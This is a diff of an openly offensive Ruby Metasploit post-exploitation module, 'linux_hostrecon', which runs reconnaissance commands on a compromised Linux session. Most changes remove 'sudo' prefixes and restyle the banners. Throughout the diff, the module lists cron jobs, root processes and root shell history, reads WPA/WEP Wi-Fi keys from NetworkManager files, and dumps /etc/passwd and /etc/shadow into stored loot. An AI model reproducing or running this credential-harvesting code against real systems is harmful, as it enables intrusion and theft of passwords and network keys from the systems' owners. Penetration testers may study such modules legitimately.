@@ -151,10 +151,10 @@ def run
   #
   # draw module banner ..
   #
-  print_line("+-----------------------------+")
-  print_line("| LINUX HOSTRECON POST-MODULE |")
-  print_line("|    Author : r00t-3xp10it    |")
-  print_line("+-----------------------------+")
+  print_line("+---------------------------------+")
+  print_line("|   LINUX HOSTRECON POST-MODULE   |")
+  print_line("|      Author : r00t-3xp10it      |")
+  print_line("+---------------------------------+")
 
 
 
@@ -168,7 +168,7 @@ def run
     # check for proper target operative system (Linux)
     #
     unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
-      print_error("[ABORT]: This module only works againt Linux systems")
+      print_error("[ABORT]: This module only works againts Linux systems ..")
       return nil
     end
     #
@@ -204,31 +204,30 @@ def run
       date_out = cmd_exec("date")
       distro_uname = cmd_exec("uname -a")
       current_shell = cmd_exec("echo $0")
-      system_shell = cmd_exec("echo \"$SHELL\"")
-      op_mode = cmd_exec("lscpu | grep \"CPU op-mode\"")
       distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
-      hardware_bits = cmd_exec("sudo lscpu | grep 'CPU op-mode'")
-      hardware_vendor = cmd_exec("sudo lscpu | grep 'Vendor ID'")
-      interface = cmd_exec("sudo netstat -r | grep default | awk {'print $8'}")
-      gateway = cmd_exec("sudo netstat -r | grep \"255.\" | awk {'print $3'}")
-      distro_description = cmd_exec("sudo cat /etc/*-release | grep 'DISTRIB_DESCRIPTION='")
-      distro_mem = cmd_exec("sudo cat /proc/meminfo | grep \"MemTotal\"; sudo cat /proc/meminfo | grep \"MemFree\"; sudo cat /proc/meminfo | grep \"MemAvailable\"; sudo cat /proc/meminfo | grep \"Dirty\"")
+      gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
+      interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
+      hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode' | awk {'print $3'}")
+      hardware_vendor = cmd_exec("lscpu | grep 'Vendor ID' | awk {'print $3'}")
+      model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
+      distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
+      distro_mem = cmd_exec("cat /proc/meminfo | grep \"MemTotal\"; cat /proc/meminfo | grep \"MemFree\"; cat /proc/meminfo | grep \"MemAvailable\"; cat /proc/meminfo | grep \"Dirty\"")
         #
         # Store data into a local variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
         #
         data_dump << "\n\n"
-        data_dump << "Date/Hour : " + date_out + "\n"
-        data_dump << "----------------------------\n"
+        data_dump << date_out
+        data_dump << "\n----------------------------\n"
         data_dump << "Running on session  : #{datastore['SESSION']}\n"
         data_dump << "Target Architecture : #{sys_info['Architecture']}\n"
         data_dump << "Target Arch (bits)  : #{hardware_bits}\n"
         data_dump << "Target Arch (vendor): #{hardware_vendor}\n"
+        data_dump << "Arch (Model name)   : #{model_name}\n"
         data_dump << "Target Computer     : #{sys_info['Computer']}\n"
-        data_dump << "Target CPU op-mode  : #{op_mode}\n"
         data_dump << "Target interface    : #{interface}\n"
-        data_dump << "Target gateway      : #{gateway}\n"
         data_dump << "Target IP addr      : #{host_ip}\n"
+        data_dump << "Target gateway      : #{gateway}\n"
         data_dump << "Payload directory   : #{payload_path}\n"
         data_dump << "Client UID          : #{target_uid}\n"
         data_dump << "Operative System    : #{sys_info['OS']}\n"
@@ -243,9 +242,6 @@ def run
         data_dump << "-------------\n"
         data_dump << current_shell
         data_dump << "\n\n"
-        data_dump << "DEFAULT SYSTEM SHELL\n"
-        data_dump << "--------------------\n"
-        data_dump << system_shell
         data_dump << "\n\n"
         data_dump << "AVAILABLE SHELLS\n"
         data_dump << "----------------\n"
@@ -264,17 +260,17 @@ def run
           #
           # bash commands to be executed remotelly ..
           #
-          cron_tasks = cmd_exec("sudo ls -la /etc/cron*")
-          root_services = cmd_exec("sudo ps -aux | grep '^root'")
-          distro_history = cmd_exec("sudo ls -la /root/.*_history")
-          distro_logs = cmd_exec("sudo find /var/log -type f -perm -4")
+          cron_tasks = cmd_exec("ls -la /etc/cron*")
+          root_services = cmd_exec("ps -aux | grep '^root'")
+          distro_history = cmd_exec("ls -la /root/.*_history")
+          distro_logs = cmd_exec("find /var/log -type f -perm -4")
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            data_dump << "----------------------------\n"
-            data_dump << " AGRESSIVE SCAN REPORTS \n"
-            data_dump << "----------------------------\n"
+            data_dump << "+--------------------------+\n"
+            data_dump << "|  AGRESSIVE SCAN REPORTS  |\n"
+            data_dump << "+--------------------------+\n"
             data_dump << "\n\n"
             data_dump << "ROOT SERVICES RUNNING\n"
             data_dump << "---------------------\n"
@@ -306,21 +302,20 @@ def run
           #
           # bash commands to be executed remotelly ..
           #
-          cookies_dump = cmd_exec("sudo ls ~/.mozilla/firefox/ | grep \".sqlite\"")
-          list_cookies = cmd_exec("sudo ls /usr/share/pyshared/mechanize | grep \"cookie\"")
+          list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep \"cookie\"")
           # Dump target WIFI credentials stored ..
-          wpa_out = cmd_exec("sudo grep psk= /etc/NetworkManager/system-connections/*")
-          wep_out = cmd_exec("sudo grep wep-key0= /etc/NetworkManager/system-connections/*")
+          wpa_out = cmd_exec("grep psk= /etc/NetworkManager/system-connections/*")
+          wep_out = cmd_exec("grep wep-key0= /etc/NetworkManager/system-connections/*")
           # dump etc/passwd & etc/shadow files from target
-          etc_pass = cmd_exec("sudo cat /etc/passwd")
-          etc_shadow = cmd_exec("sudo cat /etc/shadow")
+          etc_pass = cmd_exec("cat /etc/passwd")
+          etc_shadow = cmd_exec("cat /etc/shadow")
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            data_dump << "----------------------------\n"
-            data_dump << " REMOTE CREDENTIALS DUMP \n"
-            data_dump << "----------------------------\n"
+            data_dump << "+--------------------------+\n"
+            data_dump << "|  REMOTE CREDENTIALS DUMP |\n"
+            data_dump << "+--------------------------+\n"
             data_dump << "\n\n"
             data_dump << "WPA CREDENTIALS:\n"
             data_dump << "----------------\n"
@@ -342,8 +337,6 @@ def run
             data_dump << "----------------\n"
             data_dump << list_cookies
             data_dump << "\n\n"
-            data_dump << cookies_dump
-            data_dump << "\n\n"
         end
 
 
@@ -363,13 +356,14 @@ def run
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            data_dump << "----------------------------\n"
-            data_dump << " COMMAND EXECUTED OUTPUT \n"
-            data_dump << "----------------------------\n"
+            data_dump << "+--------------------------+\n"
+            data_dump << "|  COMMAND EXECUTED OUTPUT |\n"
+            data_dump << "+--------------------------+\n"
+            data_dump << "\n\n"
             data_dump << single_comm
             data_dump << "\n\n"
         end
-        data_dump << "----------------------------\n\n"
+        data_dump << "----------------------------"
 
 
 
@@ -389,7 +383,7 @@ def run
      # IF sellected previous in advanced options (set STORE_LOOT true) ..
      #
      if datastore['STORE_LOOT'] == true
-       print_warning("Target fingerprints stored under: ~/.msf4/loot (folder)")
+       print_warning("Fingerprints stored under: ~/.msf4/loot")
        store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
      end
    #
